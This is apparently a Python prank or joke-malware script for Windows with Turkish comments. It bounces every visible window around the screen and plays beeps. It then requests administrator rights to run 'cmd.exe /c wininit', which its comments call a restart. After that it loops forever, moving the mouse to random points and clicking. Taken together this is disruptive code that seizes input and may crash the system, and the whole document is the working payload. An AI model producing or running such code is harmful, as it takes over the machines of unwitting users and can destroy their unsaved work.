import ctypes
import random
import time
from ctypes import wintypes
from threading import Thread
import winsound  # Windows hata seslerini çalmak için

# Windows API fonksiyonlarını tanımlama
EnumWindows = ctypes.windll.user32.EnumWindows
EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
GetWindowText = ctypes.windll.user32.GetWindowTextW
GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
IsWindowVisible = ctypes.windll.user32.IsWindowVisible
MoveWindow = ctypes.windll.user32.MoveWindow
GetWindowRect = ctypes.windll.user32.GetWindowRect

# Pencere bilgilerini saklamak için bir liste
windows = []

def enum_windows_callback(hwnd, lParam):
    """Açık olan pencereleri listeye ekler."""
    if IsWindowVisible(hwnd):
        length = GetWindowTextLength(hwnd)
        if length > 0:
            title = ctypes.create_unicode_buffer(length + 1)
            GetWindowText(hwnd, title, length + 1)
            windows.append(hwnd)
    return True

def get_open_windows():
    """Açık olan tüm pencereleri alır."""
    del windows[:]  # Listeyi temizle
    EnumWindows(EnumWindowsProc(enum_windows_callback), 0)
    return windows

def bounce_window(hwnd):
    """Bir pencereyi ekranda zıplatır."""
    rect = wintypes.RECT()
    GetWindowRect(hwnd, ctypes.byref(rect))
    width = rect.right - rect.left
    height = rect.bottom - rect.top

    # Başlangıç pozisyonu
    x, y = rect.left, rect.top
    dx, dy = random.choice([-10, 10]), random.choice([-10, 10])
    screen_width = ctypes.windll.user32.GetSystemMetrics(0)
    screen_height = ctypes.windll.user32.GetSystemMetrics(1)

    for _ in range(100):  # 100 adım boyunca hareket ettir
        x += dx
        y += dy
        if x <= 0 or x + width >= screen_width:
            dx = -dx
        if y <= 0 or y + height >= screen_height:
            dy = -dy
        MoveWindow(hwnd, x, y, width, height, True)
        time.sleep(0.05)

def play_error_music():
    """Hata seslerinden oluşan bir müzik çalar."""
    print("Hata seslerinden müzik çalınıyor...")
    notes = [
        (440, 300),  # A4
        (523, 300),  # C5
        (659, 300),  # E5
        (784, 300),  # G5
        (880, 300),  # A5
    ]
    for _ in range(3):  # 3 kez tekrar et
        for freq, duration in notes:
            winsound.Beep(freq, duration)
            time.sleep(0.1)

def move_and_click_mouse():
    """Fareyi rastgele hareket ettirip tıklama yapar."""
    print("Fare hareketi ve tıklama simülasyonu başlatılıyor...")
    screen_width = ctypes.windll.user32.GetSystemMetrics(0)  # Ekran genişliği
    screen_height = ctypes.windll.user32.GetSystemMetrics(1)  # Ekran yüksekliği

    while True:
        # Rastgele bir pozisyon seç
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)

        # Fareyi hareket ettir
        ctypes.windll.user32.SetCursorPos(x, y)

        # Sol tıklama simülasyonu
        ctypes.windll.user32.mouse_event(2, 0, 0, 0, 0)  # Sol tuşa bas
        ctypes.windll.user32.mouse_event(4, 0, 0, 0, 0)  # Sol tuşu bırak

        print(f"Fare hareket ettirildi ve tıklandı: ({x}, {y})")
        time.sleep(random.uniform(0.5, 2))  # Rastgele bir süre bekle

def restart_system():
    """Sistemi yeniden başlatır."""
    try:
        # Admin yetkisiyle komut çalıştırma
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", "cmd.exe", "/c wininit", None, 1
        )
    except Exception as e:
        print(f"Yeniden başlatma işlemi başarısız oldu: {e}")

def main():
    """Simülasyonun ana akışı."""
    print("Açık olan tüm pencereler zıplatılıyor...")
    open_windows = get_open_windows()
    for hwnd in open_windows:
        bounce_window(hwnd)

    print("Hata seslerinden müzik çalınıyor...")
    play_error_music()

    print("Sistem yeniden başlatılıyor...")
    restart_system()

    # Yeniden başlatma sonrası fare simülasyonunu başlat
    print("Fare simülasyonu başlatılıyor...")
    mouse_thread = Thread(target=move_and_click_mouse)
    mouse_thread.daemon = True
    mouse_thread.start()
    mouse_thread.join()

if __name__ == "__main__":
    main()
